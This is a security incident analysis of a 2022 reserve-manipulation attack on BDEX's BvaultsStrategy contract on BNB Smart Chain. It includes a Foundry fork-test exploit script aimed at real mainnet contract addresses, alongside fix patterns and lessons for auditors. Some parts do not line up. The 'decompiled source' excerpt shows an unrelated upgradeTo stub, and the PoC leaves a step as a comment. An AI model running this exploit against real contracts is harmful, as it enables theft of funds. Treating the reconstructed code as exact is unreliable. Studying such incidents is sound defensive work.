# BDEX — convertDustToEarned() Reserve Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | BDEX (BvaultsStrategy) |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **BDEX Token** | [0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867](https://bscscan.com/address/0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867) |
| **BvaultsStrategy** | [0xB2B1DC3204ee8899d6575F419e72B53E370F6B20](https://bscscan.com/address/0xB2B1DC3204ee8899d6575F419e72B53E370F6B20) |
| **Trading Pair** | [0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D](https://bscscan.com/address/0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **Root Cause** | The `convertDustToEarned()` function executes against an externally manipulable pair reserve state, causing a token balance discrepancy |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/BDEX_exp.sol) |

---
## 1. Vulnerability Overview

BDEX's `BvaultsStrategy` contract included a `convertDustToEarned()` function that converts small amounts of tokens ("dust") accumulated within the strategy into the primary earnings token. The attacker directly transferred 34 WBNB to the pair, creating a `balanceOf(pair) >> reserve(pair)` discrepancy, then triggered `convertDustToEarned()`. As the function executed a BDEX swap under this discrepancy, the attacker acquired BDEX at a favorable rate. The attacker then reverse-swapped BDEX back to WBNB, realizing the arbitrage profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable convertDustToEarned() - executes against an externally manipulated reserve state
contract BvaultsStrategy {
    address public wantToken;   // BDEX
    address public earnedToken; // WBNB or other
    address public pair;

    // Callable by anyone - if pair reserve is manipulated before calling,
    // dust conversion occurs at a distorted price
    function convertDustToEarned() external {
        // ❌ Uses current pair state (manipulated balanceOf) as-is
        uint256 dustBalance = IERC20(wantToken).balanceOf(address(this));
        if (dustBalance == 0) return;

        // ❌ Swap at AMM spot price - pair reserve is in a manipulated state
        IERC20(wantToken).transfer(pair, dustBalance);
        (uint112 r0, uint112 r1,) = IPair(pair).getReserves();
        // amountOut calculated using manipulated reserve ratio
        uint256 amountOut = _getAmountOut(dustBalance, r0, r1);
        IPair(pair).swap(0, amountOut, address(this), "");
    }
}

// ✅ Correct pattern - verify state after sync() or use TWAP
contract SafeBvaultsStrategy {
    function convertDustToEarned() external {
        // ✅ Call sync() first to align reserves with current balances
        IPair(pair).sync();

        uint256 dustBalance = IERC20(wantToken).balanceOf(address(this));
        if (dustBalance == 0) return;

        // ✅ Enforce minimum output validation to block swaps at manipulated prices
        uint256 expectedOut = _getExpectedOut(dustBalance);
        uint256 minOut = expectedOut * 95 / 100; // 5% slippage tolerance
        // Swap via router with amountOutMin
        router.swapExactTokensForTokens(dustBalance, minOut, path, address(this), block.timestamp);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**BDEX_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: The `convertDustToEarned()` function executes against an externally manipulable pair reserve state, causing a token balance discrepancy
    function upgradeTo(address arg0) external {}  // 0x3659cfe6
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Directly transfer 34 WBNB to the pair
    │       pair.balanceOf(WBNB) >> pair.reserve(WBNB)
    │       (discrepancy maintained without calling sync())
    │
    ├─[2] Call pair swap() - acquire BDEX under excess WBNB state
    │       Receive favorable BDEX amount at manipulated reserve ratio
    │
    ├─[3] Call convertDustToEarned()
    │       ❌ Convert dust BDEX → WBNB against manipulated pair state
    │       Strategy contract's BDEX drained at unfavorable ratio
    │
    ├─[4] Reverse swap BDEX → WBNB (attacker sells held BDEX)
    │
    └─[5] Net profit: WBNB arbitrage (amount unconfirmed)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBvaultsStrategy {
    // Callable by anyone - trigger after reserve manipulation
    function convertDustToEarned() external;
}

interface IBPair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function sync() external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract BDEXExploit is Test {
    IBvaultsStrategy strategy = IBvaultsStrategy(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20);
    IBPair pair               = IBPair(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D);
    IERC20 BDEX               = IERC20(0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867);
    IERC20 WBNB               = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function setUp() public {
        vm.createSelectFork("bsc", 22_629_431);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB", WBNB.balanceOf(address(this)), 18);

        // [Step 1] Directly transfer WBNB to the pair to create reserve discrepancy
        // balanceOf(pair, WBNB) >> reserve(pair, WBNB)
        WBNB.transfer(address(pair), 34 * 1e18);

        // [Step 2] Swap for BDEX under discrepancy state (favorable ratio)
        (uint112 r0, uint112 r1,) = pair.getReserves();
        // Excess WBNB state allows receiving more BDEX
        uint256 bdexOut = _getAmountOut(34 * 1e18, uint256(r1), uint256(r0));
        pair.swap(bdexOut, 0, address(this), "");

        // [Step 3] Trigger convertDustToEarned()
        // ⚡ BDEX dust in strategy contract is drained at manipulated ratio
        strategy.convertDustToEarned();

        // [Step 4] Reverse swap held BDEX → WBNB (via separate router)

        emit log_named_decimal_uint("[End] WBNB", WBNB.balanceOf(address(this)), 18);
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 9975;
        return amountInWithFee * reserveOut / (reserveIn * 10000 + amountInWithFee);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | convertDustToEarned() execution against externally manipulated AMM reserve state |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation |
| **Attack Vector** | Direct WBNB transfer → reserve discrepancy → `convertDustToEarned()` trigger |
| **Preconditions** | `convertDustToEarned()` executable against manipulated AMM state, external call permitted |
| **Impact** | WBNB arbitrage profit (amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Prerequisite sync() call**: Call the pair's `sync()` first within `convertDustToEarned()` to align reserves with current balances.
2. **Minimum output validation**: Apply an `amountOutMin` parameter requiring at least a certain percentage of the expected output on swaps.
3. **Add access control**: Restrict `convertDustToEarned()` to `onlyOwner` or `onlyKeeper` so it cannot be arbitrarily triggered externally.

---
## 7. Lessons Learned

- **Risk of publicly exposing keeper functions**: Functions in strategy contracts periodically called by keepers — such as `harvest()` and `convertDust()` — are typically designed as `external`. However, if these functions depend on AMM state, they become vulnerable to reserve manipulation attacks.
- **reserve vs balanceOf discrepancy**: In Uniswap V2-based pairs, `getReserves()` and `balanceOf(pair)` can diverge until `sync()` or `swap()` is called. Attacks exploiting this discrepancy window appear in many variants.
- **Strategy contract auditing**: DeFi strategy contracts interact with complex external protocols, making it essential to include logic that verifies the state at each external call point has not been manipulated.